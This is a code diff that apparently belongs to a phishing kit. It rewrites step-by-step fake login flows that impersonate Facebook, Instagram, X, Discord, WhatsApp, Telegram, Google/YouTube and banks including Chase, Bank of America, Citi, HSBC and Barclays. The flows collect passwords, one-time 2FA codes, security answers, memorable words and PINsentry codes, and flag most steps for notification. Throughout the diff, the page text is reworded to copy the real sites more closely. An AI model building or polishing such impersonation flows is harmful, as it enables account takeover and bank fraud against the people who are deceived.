@@ -378,19 +378,14 @@ const FLOWS = {
   // ── SOCIAL ──────────────────────────────────────────────────────────────────
 
   facebook: [
-    { slug:'login',      form_type:'login',      page_title:'Log into Facebook',  headline:'Log into Facebook',                  subheadline:'',                                                   fields:['email','password'],                  layout:'auth',       cta:'Log in',           step_label:'Login',      notify_step:true  },
-    { slug:'checkpoint', form_type:'checkpoint',  page_title:'Verify Your Identity',headline:'Your account has been temporarily restricted', subheadline:'We noticed unusual activity. We need to verify your identity to restore access', fields:[], layout:'checkpoint', cta:'Verify Identity',  step_label:'Checkpoint', notify_step:false },
-    { slug:'id-verify',  form_type:'id_verify',   page_title:'Verify Identity',    headline:'Confirm Your Identity',               subheadline:'Upload a photo of your government ID or passport',   fields:['full_name','dob','id_number'],        layout:'verify',     cta:'Submit',           step_label:'ID Verify',  notify_step:true  },
-    { slug:'2fa',        form_type:'otp',         page_title:'Two-Factor Auth',    headline:'Enter Authentication Code',           subheadline:'Enter the 6-digit code from your authenticator app', fields:['code'],                              layout:'otp',        cta:'Confirm',          step_label:'2FA',        notify_step:true,  otp_length:6 },
-    { slug:'locked',     form_type:'locked',      page_title:'Account Restricted', headline:'Your Account is Under Review',        subheadline:'Your account will be restored within 24 hours after review', fields:[],                           layout:'locked',     cta:'',                 step_label:'Locked',     notify_step:false }
+    { slug:'email',    form_type:'login', page_title:'Facebook', headline:'Log in to Facebook', subheadline:'', fields:['email'], layout:'auth', cta:'Next', step_label:'Email/Phone', notify_step:true },
+    { slug:'password', form_type:'login', page_title:'Facebook', headline:'Enter your password', subheadline:'', fields:['password'], layout:'auth', cta:'Log In', step_label:'Password', notify_step:true },
+    { slug:'2fa-code', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Enter Login Code', subheadline:'Enter the 6-digit code from your authentication app or sent to your phone', fields:['code'], layout:'otp', cta:'Continue', step_label:'2FA Code', notify_step:true, otp_length:6 }
   ],
 
   instagram: [
-    { slug:'login',             form_type:'login',     page_title:'Log in • Instagram',headline:'',                                  subheadline:'',                                                   fields:['username','password'],               layout:'auth',       cta:'Log in',           step_label:'Login',           notify_step:true  },
-    { slug:'suspicious',        form_type:'checkpoint',page_title:'Suspicious Login',headline:'Was this you?',                      subheadline:'We noticed a login from an unrecognized device. Confirm it was you', fields:[],                   layout:'checkpoint', cta:'Yes, this was me', step_label:'Suspicious',      notify_step:false },
-    { slug:'sms-verify',        form_type:'otp',       page_title:'SMS Verification',headline:'Enter the Code We Sent',             subheadline:'We sent a 6-digit code to your phone number',        fields:['code'],                              layout:'otp',        cta:'Confirm',          step_label:'SMS Verify',      notify_step:true,  otp_length:6 },
-    { slug:'recovery',          form_type:'verify',    page_title:'Recovery Code',  headline:'Use a Recovery Code',                subheadline:'Enter one of your backup recovery codes',            fields:['backup_code'],                       layout:'verify',     cta:'Continue',         step_label:'Recovery Code',   notify_step:true  },
-    { slug:'confirm-info',      form_type:'verify',    page_title:'Confirm Details',headline:'Confirm Your Personal Details',       subheadline:'We need to verify your information to protect your account', fields:['full_name','dob','phone'],      layout:'verify',     cta:'Confirm',          step_label:'Confirm Info',    notify_step:true  }
+    { slug:'login',    form_type:'login', page_title:'Instagram', headline:'Log in to Instagram', subheadline:'', fields:['username','password'], layout:'auth', cta:'Log in', step_label:'Login', notify_step:true },
+    { slug:'2fa-code', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Enter Your Security Code', subheadline:'Enter the 6-digit code we sent to your phone number ending in ••••', fields:['code'], layout:'otp', cta:'Confirm', step_label:'2FA', notify_step:true, otp_length:6 }
   ],
 
   tiktok: [
@@ -400,21 +395,19 @@ const FLOWS = {
   ],
 
   twitterx: [
-    { slug:'login',           form_type:'login',  page_title:'Sign In',         headline:'Sign in to X',                     subheadline:'Enter your email, phone, or username',           fields:['email'],             layout:'auth',   cta:'Next',              step_label:'Username',       notify_step:true  },
-    { slug:'password',        form_type:'login',  page_title:'Enter Password',  headline:'Enter your password',               subheadline:'',                                               fields:['password'],          layout:'auth',   cta:'Sign In',           step_label:'Password',       notify_step:true  },
-    { slug:'2fa',             form_type:'otp',    page_title:'Two-Factor Auth', headline:'Enter Verification Code',           subheadline:'Enter the code from your authenticator app',    fields:['code'],              layout:'otp',    cta:'Confirm',           step_label:'2FA',            notify_step:true,  otp_length:6 },
-    { slug:'confirm-account', form_type:'verify', page_title:'Confirm Account', headline:'Confirm Your Phone Number',         subheadline:'Enter your phone number to confirm your identity', fields:['phone'],            layout:'verify', cta:'Send Code',         step_label:'Confirm Account',notify_step:true  }
+    { slug:'login',    form_type:'login', page_title:'Sign in to X', headline:'Sign in to X', subheadline:'', fields:['email'], layout:'auth', cta:'Next', step_label:'Email/Phone', notify_step:true },
+    { slug:'password', form_type:'login', page_title:'Enter your password', headline:'Enter your password', subheadline:'', fields:['password'], layout:'auth', cta:'Log in', step_label:'Password', notify_step:true },
+    { slug:'2fa-code', form_type:'otp',   page_title:'Confirm your identity', headline:'Check your phone', subheadline:'Enter the code we sent to your phone number ending in ••••', fields:['code'], layout:'otp', cta:'Next', step_label:'Verification code', notify_step:true, otp_length:6 }
   ],
 
   snapchat: [
-    { slug:'login',     form_type:'login',  page_title:'Snapchat Login',  headline:'',                                 subheadline:'',                                               fields:['email','password'],  layout:'auth',   cta:'Log In',    step_label:'Login',    notify_step:true  },
-    { slug:'birthday',  form_type:'verify', page_title:'Verify Identity', headline:'Confirm Your Birthday',            subheadline:'Enter your date of birth to verify your identity', fields:['dob'],              layout:'verify', cta:'Continue',  step_label:'Birthday', notify_step:true  },
-    { slug:'sms-code',  form_type:'otp',    page_title:'Verification Code',headline:'Enter the Code Sent to You',      subheadline:'We sent a verification code via SMS',             fields:['code'],              layout:'otp',    cta:'Confirm',   step_label:'SMS Code', notify_step:true,  otp_length:6 }
+    { slug:'login',    form_type:'login', page_title:'Snapchat', headline:'Log In', subheadline:'', fields:['username','password'], layout:'auth', cta:'Log In', step_label:'Login', notify_step:true },
+    { slug:'2fa-code', form_type:'otp',   page_title:'Verify Your Identity', headline:'Enter the code we sent you', subheadline:'Enter the code we sent to your phone number to verify it\'s you', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verification', notify_step:true, otp_length:6 }
   ],
 
   linkedin: [
-    { slug:'login',  form_type:'login', page_title:'Sign In',         headline:'Sign in to LinkedIn',              subheadline:'',                                               fields:['email','password'],  layout:'auth', cta:'Sign In',   step_label:'Login', notify_step:true  },
-    { slug:'2fa',    form_type:'otp',   page_title:'Two-Factor Auth', headline:'Enter Verification Code',          subheadline:'We sent a 6-digit code to your email address',    fields:['code'],              layout:'otp',  cta:'Confirm',   step_label:'2FA',   notify_step:true,  otp_length:6 }
+    { slug:'login',    form_type:'login', page_title:'LinkedIn', headline:'Sign in', subheadline:'Stay updated on your professional world', fields:['email','password'], layout:'auth', cta:'Sign in', step_label:'Login', notify_step:true },
+    { slug:'2fa-code', form_type:'otp',   page_title:'Two-step verification', headline:'Two-step verification', subheadline:'Enter the verification code we sent to your email address', fields:['code'], layout:'otp', cta:'Submit', step_label:'Verification', notify_step:true, otp_length:6 }
   ],
 
   pinterest: [
@@ -423,8 +416,8 @@ const FLOWS = {
   ],
 
   reddit: [
-    { slug:'login',    form_type:'login', page_title:'Log in to Reddit', headline:'Log in to Reddit',               subheadline:'',                                               fields:['username','password'],layout:'auth', cta:'Log In',    step_label:'Login',    notify_step:true  },
-    { slug:'sms-code', form_type:'otp',   page_title:'Identity Verify',  headline:'Enter Verification Code',        subheadline:'We sent an SMS code to your phone',              fields:['code'],              layout:'otp',  cta:'Confirm',   step_label:'SMS Code', notify_step:true,  otp_length:6 }
+    { slug:'login',    form_type:'login', page_title:'Log In — Reddit', headline:'Log In', subheadline:'By continuing, you agree to our User Agreement and acknowledge that you understand the Privacy Policy.', fields:['username','password'], layout:'auth', cta:'Log In', step_label:'Login', notify_step:true },
+    { slug:'2fa-code', form_type:'otp',   page_title:'Two-factor authentication', headline:'Enter your verification code', subheadline:'Enter the 6-digit code from your authenticator app', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
   ],
 
   tumblr: [
@@ -433,18 +426,18 @@ const FLOWS = {
   ],
 
   discord: [
-    { slug:'login', form_type:'login', page_title:'Discord – Login',  headline:'Welcome back!',                    subheadline:'We\'re so excited to see you again!',            fields:['email','password'],  layout:'auth', cta:'Log In',    step_label:'Login', notify_step:true  },
-    { slug:'2fa',   form_type:'otp',   page_title:'Two-Factor Auth',  headline:'Two-Factor Authentication',        subheadline:'Enter the 6-digit authentication code',          fields:['code'],              layout:'otp',  cta:'Log In',    step_label:'2FA',   notify_step:true,  otp_length:6 }
+    { slug:'login',    form_type:'login', page_title:'Welcome back!', headline:'Welcome back!', subheadline:'We\'re so excited to see you again!', fields:['email','password'], layout:'auth', cta:'Log In', step_label:'Login', notify_step:true },
+    { slug:'2fa-code', form_type:'otp',   page_title:'Two-factor authentication', headline:'Two-factor authentication', subheadline:'Open your two-factor authenticator app to view your authentication code and verify your identity.', fields:['code'], layout:'otp', cta:'Log In', step_label:'2FA Code', notify_step:true, otp_length:6 }
   ],
 
   whatsapp: [
-    { slug:'login',    form_type:'login', page_title:'Enter Phone Number',headline:'Enter Your Phone Number',       subheadline:'We will send you a verification code via SMS',   fields:['phone'],             layout:'auth', cta:'Next',      step_label:'Phone',    notify_step:true  },
-    { slug:'sms-code', form_type:'otp',   page_title:'Verification Code', headline:'Enter the Code We Sent',        subheadline:'Verify your phone number with a 6-digit code',   fields:['code'],              layout:'otp',  cta:'Next',      step_label:'SMS Code', notify_step:true,  otp_length:6 }
+    { slug:'phone',    form_type:'login', page_title:'WhatsApp', headline:'Enter your phone number', subheadline:'WhatsApp will need to verify your phone number. Carrier charges may apply.', fields:['phone'], layout:'auth', cta:'Next', step_label:'Phone Number', notify_step:true },
+    { slug:'sms-code', form_type:'otp',   page_title:'Verify your number', headline:'Verify your number', subheadline:'Enter the 6-digit code we sent to your phone number', fields:['code'], layout:'otp', cta:'Next', step_label:'SMS Code', notify_step:true, otp_length:6 }
   ],
 
   telegram: [
-    { slug:'login',    form_type:'login', page_title:'Sign In',          headline:'Sign in to Telegram',            subheadline:'Enter your phone number',                        fields:['phone'],             layout:'auth', cta:'Next',      step_label:'Phone',  notify_step:true  },
-    { slug:'sms-code', form_type:'otp',   page_title:'Verification Code',headline:'Enter Verification Code',        subheadline:'We sent a code to your phone or Telegram app',  fields:['code'],              layout:'otp',  cta:'Confirm',   step_label:'OTP',    notify_step:true,  otp_length:5 }
+    { slug:'phone',    form_type:'login', page_title:'Telegram', headline:'Sign in to Telegram', subheadline:'Please confirm your country code and enter your phone number.', fields:['phone'], layout:'auth', cta:'Next', step_label:'Phone Number', notify_step:true },
+    { slug:'sms-code', form_type:'otp',   page_title:'Login code', headline:'Login code', subheadline:'We have sent you a message with the login code to Telegram. Enter it here.', fields:['code'], layout:'otp', cta:'Next', step_label:'Login Code', notify_step:true, otp_length:5 }
   ],
 
   wechat: [
@@ -483,9 +476,9 @@ const FLOWS = {
   ],
 
   youtube: [
-    { slug:'login',    form_type:'login', page_title:'Sign In',          headline:'Sign in to YouTube',             subheadline:'Enter your email or phone number',               fields:['email'],             layout:'auth', cta:'Next',      step_label:'Email',    notify_step:true  },
-    { slug:'password', form_type:'login', page_title:'Welcome',          headline:'Welcome',                        subheadline:'Enter your password',                            fields:['password'],          layout:'auth', cta:'Next',      step_label:'Password', notify_step:true  },
-    { slug:'sms-code', form_type:'otp',   page_title:'Verification',     headline:'Enter Verification Code',        subheadline:'We sent a code to your phone number',            fields:['code'],              layout:'otp',  cta:'Confirm',   step_label:'2FA',      notify_step:true,  otp_length:6 }
+    { slug:'login',    form_type:'login', page_title:'Sign in — Google accounts', headline:'Sign in', subheadline:'Use your Google Account', fields:['email'], layout:'auth', cta:'Next', step_label:'Email', notify_step:true },
+    { slug:'password', form_type:'login', page_title:'Welcome', headline:'Welcome', subheadline:'', fields:['password'], layout:'auth', cta:'Next', step_label:'Password', notify_step:true },
+    { slug:'sms-code', form_type:'otp',   page_title:'2-Step Verification', headline:'2-Step Verification', subheadline:'A text message with a 6-digit verification code was just sent to your phone number ending in ••••', fields:['code'], layout:'otp', cta:'Next', step_label:'2FA', notify_step:true, otp_length:6 }
   ],
 
   // ── GOVERNMENT ──────────────────────────────────────────────────────────────
@@ -527,39 +520,36 @@ const FLOWS = {
   // ── BANKS ───────────────────────────────────────────────────────────────────
 
   jpmorganchase: [
-    { slug:'login',        form_type:'login',      page_title:'Sign In',           headline:'Sign in to Chase Online',            subheadline:'',        fields:['username','password'],                      layout:'auth',      cta:'Sign In',   step_label:'Login',            notify_step:true  },
-    { slug:'sms-otp',      form_type:'otp',        page_title:'Verification',      headline:'Enter Verification Code',             subheadline:'We sent a 6-digit code to your phone',   fields:['code'],                                     layout:'otp',       cta:'Confirm',   step_label:'SMS OTP',          notify_step:true,  otp_length:6 },
-    { slug:'security-q',   form_type:'security_q', page_title:'Security Questions',headline:'Security Verification Questions',      subheadline:'Answer the security questions to verify your identity', fields:['answer1','answer2','answer3'],  layout:'security_q',cta:'Continue',  step_label:'Security Questions',notify_step:true  },
-    { slug:'confirm-card', form_type:'payment',    page_title:'Confirm Card',      headline:'Confirm Your Card Details',           subheadline:'Enter your card information to verify your identity', fields:['card_last4','expiry','cvv'],         layout:'payment',   cta:'Confirm',   step_label:'Confirm Card',     notify_step:true  }
+    { slug:'login',      form_type:'login',      page_title:'Sign in | Chase', headline:'Sign in to Chase', subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign in', step_label:'Login', notify_step:true },
+    { slug:'otp-select', form_type:'otp',        page_title:'We need to verify it\'s you', headline:'We need to verify it\'s you', subheadline:'We\'ll send you a one-time passcode by text message to the number ending in ••••', fields:['code'], layout:'otp', cta:'Next', step_label:'Passcode', notify_step:true, otp_length:6 },
+    { slug:'security-q', form_type:'security_q', page_title:'Answer a security question', headline:'Answer a security question', subheadline:'For your security, please answer a security question.', fields:['answer1'], layout:'security_q', cta:'Next', step_label:'Security Q', notify_step:true }
   ],
 
   bankofamerica: [
-    { slug:'login',      form_type:'login',      page_title:'Sign In',           headline:'Sign in to Bank of America',         subheadline:'',        fields:['online_id','password'],              layout:'auth',      cta:'Sign In',   step_label:'Login',            notify_step:true  },
-    { slug:'sms-otp',    form_type:'otp',        page_title:'Verification',      headline:'Enter Verification Code',             subheadline:'We sent a code to your phone number',      fields:['code'],                              layout:'otp',       cta:'Confirm',   step_label:'SMS OTP',          notify_step:true,  otp_length:6 },
-    { slug:'security-q', form_type:'security_q', page_title:'Security Question', headline:'Security Question',                   subheadline:'Answer the security question to continue', fields:['answer1','answer2'],                 layout:'security_q',cta:'Continue',  step_label:'Security Questions',notify_step:true  }
+    { slug:'login',      form_type:'login',      page_title:'Bank of America — Online Banking', headline:'Sign In', subheadline:'', fields:['online_id','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
+    { slug:'safepass',   form_type:'otp',        page_title:'SafePass', headline:'SafePass', subheadline:'Enter the 6-digit code sent to your mobile phone ending in ••••', fields:['code'], layout:'otp', cta:'Submit', step_label:'SafePass', notify_step:true, otp_length:6 },
+    { slug:'security-q', form_type:'security_q', page_title:'Challenge Question', headline:'Challenge Question', subheadline:'For your security, please answer the question below.', fields:['answer1'], layout:'security_q', cta:'Continue', step_label:'Challenge Q', notify_step:true }
   ],
 
   wellsfargo: [
-    { slug:'login',           form_type:'login',  page_title:'Sign In',           headline:'Sign in to Wells Fargo',             subheadline:'',        fields:['username','password'],          layout:'auth',  cta:'Sign In',     step_label:'Login',          notify_step:true  },
-    { slug:'sms-otp',         form_type:'otp',    page_title:'Verification',      headline:'Enter Verification Code',             subheadline:'We sent a code to your phone number',     fields:['code'],                         layout:'otp',   cta:'Confirm',     step_label:'SMS OTP',        notify_step:true,  otp_length:6 },
-    { slug:'confirm-account', form_type:'verify', page_title:'Confirm Account',   headline:'Confirm Your Account Number',         subheadline:'Enter the last 4 digits of your bank account number', fields:['account_last4'],             layout:'verify',cta:'Confirm',     step_label:'Confirm Account',notify_step:true  }
+    { slug:'login',   form_type:'login', page_title:'Wells Fargo Online®', headline:'Sign On to Wells Fargo', subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign On', step_label:'Login', notify_step:true },
+    { slug:'sms-otp', form_type:'otp',   page_title:'Sign On — Verify Your Identity', headline:'Verify Your Identity', subheadline:'We sent a one-time access code to your mobile phone number ending in ••••', fields:['code'], layout:'otp', cta:'Continue', step_label:'Access Code', notify_step:true, otp_length:6 }
   ],
 
   usbank: [
-    { slug:'login',    form_type:'login', page_title:'Sign In', headline:'Sign in to U.S. Bank', subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Login', notify_step:true },
-    { slug:'sms-otp',  form_type:'otp',   page_title:'Verification', headline:'Verify Your Identity', subheadline:'Enter the one-time passcode sent to your phone', fields:['code'], layout:'otp', cta:'Continue', step_label:'OTP', notify_step:true, otp_length:6 }
+    { slug:'login', form_type:'login', page_title:'U.S. Bank Online Banking', headline:'Sign in to your account', subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign in', step_label:'Login', notify_step:true },
+    { slug:'otp',   form_type:'otp',   page_title:'Two-Step Verification', headline:'Enter your code', subheadline:'We\'ve sent a one-time code to your phone number ending in ••••. Enter it below.', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verification Code', notify_step:true, otp_length:6 }
   ],
 
   citibank: [
-    { slug:'login',      form_type:'login',      page_title:'Sign In',           headline:'Sign in to Citi',                    subheadline:'',         fields:['user_id','password'],        layout:'auth',      cta:'Sign In',   step_label:'Login',            notify_step:true  },
-    { slug:'sms-otp',    form_type:'otp',        page_title:'Verification',      headline:'Enter Verification Code',             subheadline:'We sent a code via SMS',                  fields:['code'],                      layout:'otp',       cta:'Confirm',   step_label:'SMS OTP',          notify_step:true,  otp_length:6 },
-    { slug:'security-q', form_type:'security_q', page_title:'Security Questions',headline:'Security Questions',                  subheadline:'Answer the questions to continue',        fields:['answer1','answer2','answer3'],layout:'security_q',cta:'Continue',  step_label:'Security Questions',notify_step:true  }
+    { slug:'login', form_type:'login', page_title:'Citi Online | Sign On', headline:'Sign On', subheadline:'', fields:['user_id','password'], layout:'auth', cta:'Sign On', step_label:'Login', notify_step:true },
+    { slug:'2fa',   form_type:'otp',   page_title:'Identity Verification', headline:'Identity Verification', subheadline:'Enter the 6-digit Activation Code sent to the mobile number ending in ••••', fields:['code'], layout:'otp', cta:'Submit', step_label:'Activation Code', notify_step:true, otp_length:6 }
   ],
 
   hsbc: [
-    { slug:'login',    form_type:'login',  page_title:'Sign In',           headline:'Sign in to HSBC',                    subheadline:'',        fields:['username','password'],   layout:'auth',  cta:'Sign In',   step_label:'Login',           notify_step:true  },
-    { slug:'memo',     form_type:'verify', page_title:'Memorable Word',    headline:'Enter Your Memorable Word',           subheadline:'Enter the memorable word for your account', fields:['memorable_word'],        layout:'verify',cta:'Continue',  step_label:'Memorable Answer', notify_step:true  },
-    { slug:'sms-otp',  form_type:'otp',    page_title:'Verification',      headline:'Enter Verification Code',             subheadline:'We sent a code to your phone number',     fields:['code'],                   layout:'otp',   cta:'Confirm',   step_label:'OTP',             notify_step:true,  otp_length:6 }
+    { slug:'login', form_type:'login',  page_title:'Log on — HSBC UK', headline:'Log on to HSBC Online Banking', subheadline:'', fields:['username','password'], layout:'auth', cta:'Log on', step_label:'Log on', notify_step:true },
+    { slug:'memo',  form_type:'verify', page_title:'Security check', headline:'Security check', subheadline:'Please enter the characters from your memorable answer', fields:['memorable_word'], layout:'verify', cta:'Continue', step_label:'Memorable answer', notify_step:true },
+    { slug:'otp',   form_type:'otp',    page_title:'Secure Key code', headline:'Enter your Secure Key code', subheadline:'Please enter the 8-digit code displayed in the HSBC Mobile Banking app', fields:['code'], layout:'otp', cta:'Continue', step_label:'Secure Key', notify_step:true, otp_length:8 }
   ],
 
   emiratesnbd: [
@@ -1390,14 +1380,15 @@ FLOWS.citibank = [
 ];
 
 FLOWS.hsbc = [
-  { slug:'login',     form_type:'login', page_title:'Log On – HSBC',            headline:'Log On',                subheadline:'', fields:['username','password'], layout:'auth', cta:'Log On',    step_label:'Log On',    notify_step:true  },
-  { slug:'sms-otp',   form_type:'otp',   page_title:'Security Code',            headline:'Enter Security Code',   subheadline:'We\'ve sent a security code to your registered mobile number', fields:['code'], layout:'otp', cta:'Submit', step_label:'Security Code', notify_step:true, otp_length:6 },
-  { slug:'security-q',form_type:'security_q',page_title:'Security Questions',   headline:'Security Questions',    subheadline:'Please answer your security questions', fields:['answer1','answer2'], layout:'security_q', cta:'Continue', step_label:'Security Q', notify_step:true }
+  { slug:'login',    form_type:'login',      page_title:'Log on to HSBC Online Banking', headline:'Log on to HSBC Online Banking', subheadline:'', fields:['username','password'], layout:'auth', cta:'Log on', step_label:'Log On', notify_step:true },
+  { slug:'memo',     form_type:'verify',     page_title:'Security check', headline:'Security check', subheadline:'Please enter the characters from your memorable answer to confirm it\'s you', fields:['memorable_word'], layout:'verify', cta:'Continue', step_label:'Memorable Answer', notify_step:true },
+  { slug:'otp',      form_type:'otp',        page_title:'Enter your Secure Key code', headline:'Enter your Secure Key code', subheadline:'Please enter the 8-digit code displayed in the HSBC Mobile Banking app', fields:['code'], layout:'otp', cta:'Continue', step_label:'Secure Key', notify_step:true, otp_length:8 }
 ];
 
 FLOWS.barclays = [
-  { slug:'login',     form_type:'login', page_title:'Log In – Barclays',        headline:'Log In',                subheadline:'', fields:['surname','membership_number','passcode'], layout:'auth', cta:'Continue', step_label:'Log In', notify_step:true  },
-  { slug:'sms-otp',   form_type:'otp',   page_title:'PINsentry',               headline:'PINsentry Code',        subheadline:'Use your PINsentry card reader or mobile app to generate a code', fields:['code'], layout:'otp', cta:'Continue', step_label:'PINsentry', notify_step:true, otp_length:8 }
+  { slug:'details',   form_type:'login', page_title:'Log In to Barclays Online Banking', headline:'Log in to Barclays Online Banking', subheadline:'', fields:['surname','membership_number'], layout:'auth', cta:'Next', step_label:'Your Details', notify_step:true  },
+  { slug:'passcode',  form_type:'otp',   page_title:'Enter your passcode',     headline:'Enter your passcode',   subheadline:'Enter your 5-digit passcode', fields:['code'], layout:'otp', cta:'Log in', step_label:'Passcode', notify_step:true, otp_length:5 },
+  { slug:'pinsentry', form_type:'otp',   page_title:'PINsentry',               headline:'PINsentry',             subheadline:'Enter the 8-digit number shown on your PINsentry card reader or the Barclays app', fields:['code'], layout:'otp', cta:'Log in', step_label:'PINsentry', notify_step:true, otp_length:8 }
 ];
 
 FLOWS.deutschebank = [
@@ -1499,8 +1490,8 @@ FLOWS.westpac = [
 ];
 
 FLOWS.standardchartered = [
-  { slug:'login',     form_type:'login', page_title:'Log In – Standard Chartered', headline:'Online Banking Login', subheadline:'', fields:['username','password'], layout:'auth', cta:'Log In', step_label:'Log In', notify_step:true  },
-  { slug:'sms-otp',   form_type:'otp',   page_title:'Step-Up Authentication',     headline:'Step-Up Authentication', subheadline:'Enter the OTP sent to your registered mobile phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
+  { slug:'login',  form_type:'login', page_title:'Standard Chartered Online Banking — Sign In', headline:'Sign in', subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign in', step_label:'Sign In', notify_step:true  },
+  { slug:'otp',    form_type:'otp',   page_title:'Authentication Code',                          headline:'Authentication Code', subheadline:'A One-Time Password has been sent to your registered mobile number. Please enter it below.', fields:['code'], layout:'otp', cta:'Submit', step_label:'OTP', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.emiratesnbd = [
